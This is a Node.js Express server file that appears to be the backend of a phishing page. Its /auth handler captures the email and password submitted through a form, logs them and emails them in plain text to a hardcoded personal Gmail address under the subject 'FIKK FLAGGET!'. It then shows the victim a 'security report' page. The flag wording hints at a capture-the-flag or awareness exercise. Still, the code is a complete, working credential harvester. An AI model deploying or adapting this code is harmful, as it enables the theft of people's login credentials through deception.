require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware to parse URL-encoded data from the form
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to handle form submission
app.post('/auth', async (req, res) => {
    const { email, password } = req.body;
    console.log(email, password);
    // Set up Nodemailer transporter
    const transporter = nodemailer.createTransport({
        service: 'gmail', // or any email service you use (e.g., SMTP for Outlook)
        auth: {
            user: process.env.EMAIL_USER,
            pass: process.env.EMAIL_PASS,
        },
    });

    // Email options
    const mailOptions = {
        from: process.env.EMAIL_USER,
        to: 'ulrik.hesmyr@gmail.com', // Replace with the recipient's email address
        subject: 'FIKK FLAGGET!',
        text: `${email} ${password}`,
    };

    // Send the email
    try {
        await transporter.sendMail(mailOptions);
        return res.sendFile(path.join(__dirname, 'public/security_report.html'));    
    } catch (error) {
        console.error('Error sending email:', error);
    }
    
});

app.post('/submit-report', async (req, res)=>{
    const {incident_id, message} = req.body;
    console.log(incident_id, message);
    return res.sendFile(path.join(__dirname, 'public/reciept.html'));
})

// Start the server
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
});
